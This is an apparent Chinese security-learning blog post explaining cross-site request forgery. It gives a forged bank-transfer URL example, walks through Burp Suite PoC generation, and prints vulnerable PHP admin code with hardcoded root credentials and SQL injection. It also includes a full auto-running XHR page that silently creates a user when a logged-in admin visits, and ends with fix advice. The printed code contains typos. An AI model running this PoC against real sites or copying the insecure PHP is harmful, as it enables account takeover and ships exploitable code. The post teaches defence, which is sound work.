@@ -1,0 +1,343 @@
+<!DOCTYPE html>
+<html class="dark" lang="zh-CN" prefix="og: http://ogp.me/ns# 
+fb: http://ogp.me/ns/fb#
+article: http://ogp.me/ns/article#">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="keywords" content="">
+
+<title>CSRF漏洞 || woejk0x&#39;s blogs</title>
+<link rel="icon" href="https://wo3jk.github.ioimages/wang.icon" type="image/x-icon">
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<meta property="og:title" content="CSRF漏洞">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://wo3jk.github.io/2026/02/03/CSRF%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:image" content="">
+<meta property="og:site_name" content="woejk0x&#39;s blogs">
+<meta property="og:author" content="woejk0x">
+
+  
+  
+  
+  <meta name="description" content="介绍CSRF（Cross-siterequestforgery，跨站请求伪造）也被称为OneClickAttack或者SessionRiding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信">
+
+
+<script src="/js/wang.js"></script>
+
+<link rel="stylesheet" href="/css/wang.css">
+<script> console.log("Hello hexo-theme-wang"); </script>
+<meta name="generator" content="Hexo 8.1.1"></head>
+<body>
+<main>
+    <div id="agplAlert" style="z-index: 9999;">
+    <strong>请遵守AGPL 3.0协议</strong> 本主题已开源于<a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang">hexo-theme-wang</a>
+</div>
+    <header>
+    <nav>
+        <ul>
+            
+                <li>
+                    <a href="/" rel="noopener">
+                        
+                            <img src="/images/menu_ico/home.svg" class="menu-icon" alt="首页">
+                        
+                        首页
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/archives" rel="noopener">
+                        
+                            <img src="/images/menu_ico/archives.svg" class="menu-icon" alt="归档">
+                        
+                        归档
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/categories" rel="noopener">
+                        
+                            <img src="/images/menu_ico/categories.svg" class="menu-icon" alt="分类">
+                        
+                        分类
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/tags" rel="noopener">
+                        
+                            <img src="/images/menu_ico/tags.svg" class="menu-icon" alt="标签">
+                        
+                        标签
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/about" rel="noopener">
+                        
+                            <img src="/images/menu_ico/about.svg" class="menu-icon" alt="关于">
+                        
+                        关于
+                    </a>
+                </li>
+            
+                <li>
+                    <a href="/links" rel="noopener">
+                        
+                            <img src="/images/menu_ico/links.svg" class="menu-icon" alt="友链">
+                        
+                        友链
+                    </a>
+                </li>
+            
+            
+        </ul>
+    </nav>
+</header>
+
+<script src="/js/header.js"></script>
+
+
+    
+    <aside class="sidebar-container sidebar-left">
+    <div class="sidebar-bg">
+        <h2 class="site-title">woejk0x's blogs</h2>
+        <img class="avatar avatar-round" src="/images/Myblogs.jpg" style="width:50px;" alt="网站头像">
+        <h2 class="site-author">woejk0x</h2>
+        <h3 class="site-subtitle">网络安全爱好者，目标是成为一名优秀的渗透测试工程师</h3>
+    </div>
+    <div class="sidebar-bg">
+        <ul class="social_links">
+            
+                <li>
+                    <a target="_blank" rel="noopener" href="https://github.com/Wo3jk" aria-label="Github的链接">
+                        
+                            <div style="display: flex; margin-left: auto; margin-left: auto; justify-content: center;">
+                                <img src="/images/social_links/github.svg" class="icon" alt="Github的图标"><p>Github</p>
+                            </div>
+                        
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+</aside>
+<div class="post-container">
+  <article class="post">
+    <h1 class="post-title">CSRF漏洞</h1>
+
+    <div class="post-meta">
+      <span class="post-date">发布于 <time datetime="2026-02-03T07:00:00.000Z">2026-02-03</time></span>
+      
+        <span class="post-categories">
+          分类：<a class="category-link" href="/categories/Web%E6%BC%8F%E6%B4%9E/">Web漏洞</a>
+        </span>
+      
+      
+        <span class="post-updated">
+          最后更新于 <time datetime="2026-02-03T04:14:25.077Z">2026-02-03</time>
+        </span>
+      
+      <span style="margin-left:10px;">👁<span id="busuanzi_value_page_pv"></span></span>
+    </div>
+    <div class="post-content">
+      <h1 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h1><p>CSRF（Cross-site request forgery，跨站请求伪造）也被称为One Click Attack或者SessionRiding，通常缩写为CSRF或者XSRF，是一种对网站的恶意利用。尽管听起来像跨站脚本（XSS)，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装成受信任用户请求受信任的网站。与XSS攻击相比，CSRF攻击往往不大流行（因此对其进行防范的资源也相当稀少）也难以防范，所以被认为比XSS更具危险性。</p>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><p>其实可以这样理解CSRF：攻击者利用目标用户的身份，以目标用户的名义执行某些非法操作。CSRF能够做的事情包括：以目标用户的名义发送邮件、发消息，盗取目标用户的账号，甚至购买商品、虚拟货币转账，这会泄露个人隐私并威肋到了目标用户的财产安全。<br>举个例子，你想给某位用户转账100元，那么单击“转账”按钮后，发出的HTTP请求会与<a target="_blank" rel="noopener" href="http://www.xxbank.com/pay.php?user-xx&amp;money100%E7%B1%BB%E4%BC%BC%E3%80%82%E8%80%8C%E6%94%BB%E5%87%BB%E8%80%85%E6%9E%84%E9%80%A0%E9%93%BE%E6%8E%A5(http://www.xxbank.com/pay.php?user-hack&amp;money=100)%EF%BC%8C%E5%BD%93%E7%9B%AE%E6%A0%87%E7%94%A8%E6%88%B7%E8%AE%BF%E9%97%AE%E4%BA%86%E8%AF%A5URL%E5%90%8E%EF%BC%8C%E5%B0%B1%E4%BC%9A%E8%87%AA%E5%8A%A8%E5%90%91Hack%E8%B4%A6%E5%8F%B7%E8%BD%AC%E8%B4%A6100%E5%85%83%EF%BC%8C%E8%80%8C%E4%B8%94%E8%BF%99%E5%8F%AA%E6%B6%89%E5%8F%8A%E7%9B%AE%E6%A0%87%E7%94%A8%E6%88%B7%E7%9A%84%E6%93%8D%E4%BD%9C%EF%BC%8C%E6%94%BB%E5%87%BB%E8%80%85%E5%B9%B6%E6%B2%A1%E6%9C%89%E8%8E%B7%E5%8F%96%E7%9B%AE%E6%A0%87%E7%94%A8%E6%88%B7%E7%9A%84cookie%E6%88%96%E5%85%B6%E4%BB%96%E4%BF%A1%E6%81%AF%E3%80%82">http://www.xxbank.com/pay.php?user-xx&amp;money100类似。而攻击者构造链接(http://www.xxbank.com/pay.php?user-hack&amp;money=100)，当目标用户访问了该URL后，就会自动向Hack账号转账100元，而且这只涉及目标用户的操作，攻击者并没有获取目标用户的cookie或其他信息。</a><br>CSRF的攻击过程有以下两个重点。</p>
+<ul>
+<li>目标用户已经登录了网站，能够执行网站的功能。</li>
+<li>目标用户访问了攻击者构造的URL。</li>
+</ul>
+<h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>CSRF漏洞经常被用来制作蠕虫攻击、刷SEO流量等。下面以蠕虫攻击为例，如图展示了一个博客系统发布文章的页面，接着单击“发布文章”按钮并使用BurpSuiet抓包。<br><img src="/CSRF%E6%BC%8F%E6%B4%9E/Pastedimage20260201114044.png"><br>可以看到在Burp Suite中，有一个自动构造CSRF PoC的功能（右击→Engagementtools→Generate CSRF PoC)，如图所示。<br><img src="/CSRF%E6%BC%8F%E6%B4%9E/Pastedimage20260201114119.png"><br>Burp Suite会生成一段HTML代码，此HTML代码即为CSRF漏洞的测试代码，单<br>击“Copy HTML”按钮，如图所示。<br><img src="/CSRF%E6%BC%8F%E6%B4%9E/Pastedimage20260201114246.png"><br>将CSRF测试代码发布到一个网站中，例如链接为<a target="_blank" rel="noopener" href="http://xx.com/1.html%EF%BC%8C%E5%A6%82%E5%9B%BE%E6%89%80%E7%A4%BA%E3%80%82">http://xx.com/1.html，如图所示。</a><br><img src="/CSRF%E6%BC%8F%E6%B4%9E/Pastedimage20260201114321.png"><br>接着诱导目标用户访问<a target="_blank" rel="noopener" href="http://xx.com/1.html%EF%BC%8C%E5%BD%93%E7%9B%AE%E6%A0%87%E7%94%A8%E6%88%B7%E5%A4%84%E4%BA%8E%E7%99%BB%E5%BD%95%E7%8A%B6%E6%80%81%EF%BC%8C%E5%B9%B6%E4%B8%94%E5%9C%A8%E5%90%8C%E4%B8%80%E6%B5%8F%E8%A7%88%E5%99%A8%E8%AE%BF%E9%97%AE%E4%BA%86%E8%AF%A5%E7%BD%91%E5%9D%80%E5%90%8E%EF%BC%8C%E7%9B%AE%E6%A0%87%E7%94%A8%E6%88%B7%E5%B0%B1%E4%BC%9A%E8%87%AA%E5%8A%A8%E5%8F%91%E5%B8%83%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%EF%BC%8C%E5%A6%82%E5%9B%BE%E6%89%80%E7%A4%BA%E3%80%82%E8%BF%99%E4%B8%AA%E6%94%BB%E5%87%BB%E8%BF%87%E7%A8%8B%E5%B0%B1%E6%98%AFCSRF%E5%88%A9%E7%94%A8%E7%9A%84%E8%BF%87%E7%A8%8B%E3%80%82">http://xx.com/1.html，当目标用户处于登录状态，并且在同一浏览器访问了该网址后，目标用户就会自动发布一篇文章，如图所示。这个攻击过程就是CSRF利用的过程。</a><br><img src="/CSRF%E6%BC%8F%E6%B4%9E/Pastedimage20260201114434.png"></p>
+<h1 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h1><p>下面的代码是后台添加用户的代码，执行的流程如下所示。</p>
+<ul>
+<li>获取GET参数username和参数password，然后通过select语句查询是否存在对应的用户，如果用户存在，会通过<code>$_SESSION</code>设置一个session:isadmin&#x3D;admin，否则设置session:isadmin&#x3D;guest。</li>
+<li>接下来判断session中的isadmin是否为admin，如果isadmin !&#x3D; admin，说明用户没有登录，那么跳转到登录页面。所以只有在管理员登录后才能执行添加用户的操作。</li>
+<li>获取POST参数username和参数password，然后插入users表中，完成添加用户的操作。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	session_start();</span><br><span class="line">	if (isset($_GET[&#x27;login&#x27;]))&#123;</span><br><span class="line">		$con=mysqli_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;123456&quot;,&quot;test&quot;);</span><br><span class="line">		if (mysqli_connect_errno())</span><br><span class="line">		&#123;</span><br><span class="line">			echo &quot;连接失败: &quot; . mysqli_connect_error();</span><br><span class="line">		&#125;</span><br><span class="line">		$username = addslashes($_GET[&#x27;username&#x27;]);</span><br><span class="line">		$password = $_GET[&#x27;password&#x27;];</span><br><span class="line">		$result = mysqli_query($con,&quot;select * from users where `username`=&#x27;&quot;.$username.&quot;&#x27; and `password`=&#x27;&quot;.md5($password).&quot;&#x27;&quot;);</span><br><span class="line">		$row = mysqli_fetch_array($result);</span><br><span class="line">		if ($row) &#123;</span><br><span class="line">			$_SESSION[&#x27;isadmin&#x27;] = &#x27;admin&#x27;;</span><br><span class="line">			exit(&quot;登录成功&quot;);</span><br><span class="line">		&#125;else&#123;</span><br><span class="line">			$_SESSION[&#x27;isadmin&#x27;] = &#x27;guest&#x27;；</span><br><span class="line">			exit(&quot;登录失败&quot;);\</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;else&#123;</span><br><span class="line">		$_SESSION[&#x27;isadmin&#x27;] = &#x27;guest&#x27;;</span><br><span class="line">	&#125;</span><br><span class="line">	if ($_sESsIoN[&#x27;isadmin&#x27;] != &#x27;admin&#x27;)&#123;</span><br><span class="line">		exit(&quot;请登录后台&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	if (isset($_POST[&#x27;submit&#x27;])) &#123;</span><br><span class="line">		if (isset($_POST[&#x27;username&#x27;])) &#123;</span><br><span class="line">			$result1 = mysqli_query($con,&quot;insert into users(`username`,`password`）</span><br><span class="line">VALUES (&#x27;&quot;.$_POST[&#x27;username&#x27;].&quot;&#x27;,&#x27;&quot;.md5($_POST[&#x27;password&#x27;]).&quot;&#x27;)&quot;);</span><br><span class="line">			exit($_POST[&#x27;username&#x27;].&quot;添加成功&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>当管理员访问了攻击者构造的CSRF页面后，会自动创建一个账号，CSRF利用代码如下。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE HTML PUBLIC &quot;-//W3C//DTD HTML 4.01 Transitional//EN&quot;&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;script type=&quot;text/javascript&quot; language=&quot;javascript&quot;&gt;</span><br><span class="line">var pauses = new Array( &quot;16&quot; );</span><br><span class="line">var methods = new Array( &quot;POST&quot; )；</span><br><span class="line">var urls = new Array( &quot;http://xxx.com/csrf.php&quot; );</span><br><span class="line">var params = new Array( &quot;submit=1&amp;username=1&amp;password=1&quot; );</span><br><span class="line">function pausecomp(millis)</span><br><span class="line">&#123;</span><br><span class="line">	var date = new Date();</span><br><span class="line">	var curDate = null;</span><br><span class="line">	do &#123; curDate = new Date(); &#125; </span><br><span class="line">	while(curDate-date &lt; millis);</span><br><span class="line">&#125;</span><br><span class="line">function run() &#123;</span><br><span class="line">	var count = 1;</span><br><span class="line">	var i=0;</span><br><span class="line"></span><br><span class="line">	for(i=0; i&lt;count; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		makeXHR(methods[i], urls[i], params[i]);</span><br><span class="line">		pausecomp(pauses[i]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">var http_request = false;</span><br><span class="line">function makexHR(method, url, parameters) &#123;</span><br><span class="line">	http_request =false;</span><br><span class="line">	if (window.XMLHttpRequest) &#123; // Mozilla，Safari,...</span><br><span class="line">		http_request = new XMLHttpRequest();</span><br><span class="line">		if (http_request.overrideMimeType）&#123;</span><br><span class="line">			http_request.overrideMimeType(&#x27;text/html&#x27;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; else if (window.ActiveXObject) &#123; // IE</span><br><span class="line">		try &#123;</span><br><span class="line">			http_request = new ActivexObject(&quot;Msxml2.XMLHTTP&quot;);</span><br><span class="line">		&#125; catch (e) &#123;</span><br><span class="line">			try &#123;</span><br><span class="line">				http_request = new ActivexObject(&quot;Microsoft.XMLHTTP&quot;);</span><br><span class="line">			&#125; catch (e) &#123;&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	if (!http_request) &#123;</span><br><span class="line">		alert(&#x27;Cannot create XMLHTTP instance&#x27;);</span><br><span class="line">		return false;</span><br><span class="line">	&#125;</span><br><span class="line">		</span><br><span class="line">	// http_request.onreadystatechange = alertContents;</span><br><span class="line">	</span><br><span class="line">	if(method == &#x27;GET&#x27;) &#123;</span><br><span class="line">		if(url.indexOf(&#x27;?&#x27;) == -1) &#123;</span><br><span class="line">			url = url + &#x27;?&#x27; + parameters;</span><br><span class="line">		&#125;else &#123;</span><br><span class="line">			url = url + &#x27;&amp;&#x27; + parameters;</span><br><span class="line">		&#125;</span><br><span class="line">		http_request.open(method,url,true);</span><br><span class="line">		http_request.send(&quot;&quot;);</span><br><span class="line">	&#125; else if(method == &#x27;POST&#x27;) &#123;</span><br><span class="line">		http_request.open(method, url, true);</span><br><span class="line">		http_request.setRequestHeader(&quot;Content-type&quot;</span><br><span class="line">&quot;application/x-www-form-urlencoded&quot;);</span><br><span class="line">		http_request.setRequestHeader(&quot;Content-length&quot;, parameters.length);</span><br><span class="line">		http_request.setRequestHeader(&quot;Connection&quot;, &quot;close&quot;)；</span><br><span class="line">		http_request.send(parameters);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body onload=&quot;run()&quot;&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>此代码的作用是创建一个AJAX请求，请求的URL是<a target="_blank" rel="noopener" href="http://xx.com/csrf.php%EF%BC%8C%E5%8F%82%E6%95%B0%E6%98%AFsubmit=1&username=1&password=1%EF%BC%8C%E4%BB%8E%E4%B8%8A%E8%BF%B0PHP%E4%BB%A3%E7%A0%81%E4%B8%AD%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%EF%BC%8C%E6%AD%A4AJAX%E8%AF%B7%E6%B1%82%E5%B0%B1%E6%98%AF%E6%89%A7%E8%A1%8C%E4%B8%80%E4%B8%AA%E6%B7%BB%E5%8A%A0%E7%94%A8%E6%88%B7%E7%9A%84%E6%93%8D%E4%BD%9C%EF%BC%8C%E7%94%B1%E4%BA%8E%E7%AE%A1%E7%90%86%E5%91%98%E5%B7%B2%E7%99%BB%E5%BD%95%EF%BC%8C%E6%89%80%E4%BB%A5%E7%AE%A1%E7%90%86%E5%91%98%E8%AE%BF%E9%97%AE%E6%AD%A4%E9%93%BE%E6%8E%A5%E5%90%8E%E5%B0%B1%E4%BC%9A%E6%88%90%E5%8A%9F%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%96%B0%E7%94%A8%E6%88%B7%E3%80%82">http://xx.com/csrf.php，参数是submit=1&amp;username=1&amp;password=1，从上述PHP代码中可以看到，此AJAX请求就是执行一个添加用户的操作，由于管理员已登录，所以管理员访问此链接后就会成功创建一个新用户。</a></p>
+<h1 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h1><p>针对CSRF漏洞的修复，笔者给出以下这两点建议。</p>
+<ul>
+<li>验证请求的Referer值，如果Referer是以自己的网站开头的域名，则说明该请求来自网站自己，是合法的。如果Referer是其他网站域名或空白，就有可能是CSRF攻击，那么服务器应拒绝该请求，但是此方法存在被绕过的可能。</li>
+<li>CSRF攻击之所以能够成功，是因为攻击者可以伪造用户的请求，由此可知，抵御CSRF攻击的关键在于：在请求中放入攻击者不能伪造的信息。例如可以在HTTP请求中以参数的形式加入一个随机产生的token，并在服务器端验证token，如果请求中没有token或者token的内容不正确，则认为该请求可能是CSRF攻击从而拒绝该请求。</li>
+</ul>
+
+    </div>
+  </article>
+  <div class="ccbyncsa">
+    <div class="container">
+        <div class="row">
+            <div class="col-md-12">
+                <div class="copyright">
+                    <div class="author">
+                        <p>作者</p>
+                        <p>woejk0x</p>
+                    </div>
+                    <div class="title">
+                        <p>标题</p>
+                        <p>CSRF漏洞</p>
+                    </div>
+                        <div class="publish">
+                            <p>发布于</p>
+                            <p>2026-02-03</p>
+                        </div>
+                    <div class="ccbyncsa-icon">
+                        <p>授权协议</p>
+                        <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">
+                        <p class="ccbyncsa-icon-imgs" style="display: flex;">
+                        <img src="/images/cc.svg" alt="cc">
+                        <img src="/images/by.svg" alt="by">
+                        <img src="/images/nc.svg" alt="nc">
+                        <img src="/images/sa.svg" alt="sa">
+                        </p>
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+  <nav class="post-pagination">
+    
+      <div class="post-prev">
+        <span class="nav-label">上一篇</span>
+        <a href="/2026/02/03/SQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/">SQL注入绕过技术</a>
+      </div>
+    
+    
+  </nav>
+  
+
+</div>
+
+<script src="/js/copy.js"></script>
+
+<aside class="sidebar-container sidebar-right">
+    <div class="sidebar-bg">
+        <p id="date"></p>
+<script>
+  function updateDate() {
+    var now = new Date();
+    var dateString = now.toISOString().slice(0, 10);
+    document.getElementById('date').textContent = dateString;
+  }
+
+  window.addEventListener('load', function() {
+    updateDate();
+    // 更新频率为每5分钟更新一次，减少不必要的更新
+    setInterval(updateDate, 300000);
+  });
+</script>
+        <span id="clock" role="timer" aria-live="polite"></span>
+
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const clockElement = document.getElementById('clock');
+    let timerInterval;
+
+    // 格式化时间函数
+    function formatTime(unit) {
+      return unit < 10 ? '0' + unit : unit;
+    }
+
+    // 更新时钟 - 包含秒
+    function updateClock() {
+      const now = new Date();
+      const hours = formatTime(now.getHours());
+      const minutes = formatTime(now.getMinutes());
+      const seconds = formatTime(now.getSeconds());
+      clockElement.textContent = `${hours}:${minutes}:${seconds}`;
+    }
+
+    // 初始化时钟
+    function startClock() {
+      // 立即更新一次时间
+      updateClock();
+      // 每秒更新一次
+      timerInterval = setInterval(updateClock, 1000);
+    }
+
+    // 页面可见性变化时的优化
+    document.addEventListener('visibilitychange', function() {
+      if (document.hidden) {
+        // 页面不可见时停止更新
+        clearInterval(timerInterval);
+      } else {
+        // 页面重新可见时，重新开始
+        clearInterval(timerInterval);
+        startClock();
+      }
+    });
+
+    // 启动时钟
+    startClock();
+  });
+</script>
+
+
+    </div>
+    <div class="sidebar-bg">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">利用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E4%BB%A3%E7%A0%81"><span class="toc-number">4.</span> <span class="toc-text">分析代码</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">5.</span> <span class="toc-text">修复建议</span></a></li></ol>
+    </div>
+    <div class="sidebar-bg">
+        <div class="card-tags">
+            
+                <a href="/tags/%E5%9F%BA%E7%A1%80/" class="tag" aria-label="标签: #基础">#基础</a>
+            
+                <a href="/tags/CSRF%E6%BC%8F%E6%B4%9E/" class="tag" aria-label="标签: #CSRF漏洞">#CSRF漏洞</a>
+            
+        </div>
+    </div>
+    <div>
+        <div class="categories-list">
+            
+                <div class="category-item">
+                    <a href="/categories/Web%E6%BC%8F%E6%B4%9E/" aria-label="分类: Web漏洞">
+                        Web漏洞
+                        <span>(13)</span>
+                    </a>
+                </div>
+            
+        </div>
+    </div>
+</aside>
+
+    <!-- No categories available -->
+
+
+    <footer>
+    <span id="busuanzi_container_site_pv" style="display: inline;"></span>
+    <span>👁<span id="busuanzi_value_site_pv"></span></span>
+    <div class="padding border border-sub border-dotted fadein-right">
+        <span style="color:aliceblue">👤<span id="busuanzi_value_site_uv"></span></span>
+    </div>
+    <span>
+        由 <a target="_blank" rel="noopener" href="https://hexo.io" alt="Hexo">
+            <p class="hover-underline night" style="display: inline;">Hexo</p>
+        </a> 驱动
+        <p style="display: inline; color: red;">❤</p>
+        <a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang" alt="Wang">
+            <p class="hover-underline night" style="display: inline;">Wang</p>
+        </a> 主题构建
+    </span>
+
+    <!-- 带图片的链接 -->
+    <div class="footer-links">
+        
+    </div>
+
+    <!-- 纯文本链接 -->
+    <div class="footer-text-links">
+        
+    </div>
+</footer>
+    
+<script src="/js/background.js"></script>
+    
+</main>
+</body>
+</html>
